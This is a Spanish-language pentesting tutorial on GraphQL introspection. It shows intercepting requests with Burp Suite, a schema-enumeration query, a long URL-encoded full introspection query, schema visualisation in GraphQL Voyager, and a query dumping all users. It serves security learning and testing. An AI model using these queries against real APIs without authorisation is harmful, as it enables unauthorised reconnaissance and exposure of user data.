
# Introducción 
  
La introspección en GraphQL es una característica que permite a los desarrolladores explorar dinámicamente el esquema de una API GraphQL para comprender sus tipos de datos y operaciones disponibles. Sin embargo, si no se controla adecuadamente, puede convertirse en una vulnerabilidad de seguridad al exponer información confidencial del esquema de la API a posibles atacantes, lo que podría facilitar ataques dirigidos.
# Ejemplo de Introspection:

Tenemos un sitio web donde se nos muestran las publicaciones que han hecho los usuarios.

![[Pasted image 20240224093141.png]]

Al interceptar esto con Burp Suite, podemos ver que se está realizando una solicitud por POST a GraphQL, donde se hace una consulta para saber cuáles publicaciones se han hecho, el título de la publicación, el contenido de la publicación y el usuario que hizo la publicación, y da como respuesta la información solicitada.

![[Pasted image 20240224094307.png]]

Toda esta información inicialmente va a GraphQL. Entonces, podemos enviar una consulta maliciosa que enumera todos los tipos existentes, como la siguiente:

```graphql
query={__schema{types{name,fields{name}}}}
```

Al usar esta consulta dentro de GraphQL, nos mostrará todos los tipos existentes.

![[Pasted image 20240224095105.png]]

También podemos enumerar el esquema de todas las bases de datos haciendo lo siguiente. Primero, tenemos que introducir esta consulta en la URL:

```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```

Y damos enter.

![[Pasted image 20240224101719.png]]

Nos está dando varios errores. Entonces, lo que tenemos que hacer es modificar la consulta y poner `__` antes de cada tipo para que ahora sí se interprete bien. Quedaría algo así:

![[Pasted image 20240224102808.png]]
![[Pasted image 20240224102858.png]]

Listo, ahora con estas modificaciones, podemos dar al botón de ejecutar y al parecer todo está bien, y nos ha dado como respuesta todo el esquema.

![[Pasted image 20240224103445.png]]

Ahora, con ayuda de [GraphQL Voyager](https://graphql-kit.com/graphql-voyager/), vamos a poder ver todo el esquema de manera más gráfica, de manera de diagrama. Lo único que tenemos que hacer es copiar la respuesta de la consulta que hicimos anteriormente. Luego, entramos a este sitio web [GraphQL Voyager](https://graphql-kit.com/graphql-voyager/). Después, ya en el sitio, damos clic en el siguiente botón:

![[Pasted image 20240224104301.png]]

Seguidamente, nos vamos a la parte de introspección y pegamos la respuesta de la consulta en el campo, para después darle clic al botón "Display".

![[Pasted image 20240224113909.png]]

Ahora podremos ver en forma de diagrama toda la estructura de la base de datos.

![[Pasted image 20240224114116.png]]

Ahora, sabiendo cómo es el esquema, lo que podemos hacer es modificar la consulta para ver diferentes cosas, como en el caso de los usuarios.

![[Pasted image 20240224115225.png]]

Y listo, ahora podemos ver todos los usuarios que existen.



Si deseas obtener más información sobre la seguridad en GraphQL y cómo prevenir posibles vulnerabilidades, puedes consultar: [HackTricks - Pentesting de GraphQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql)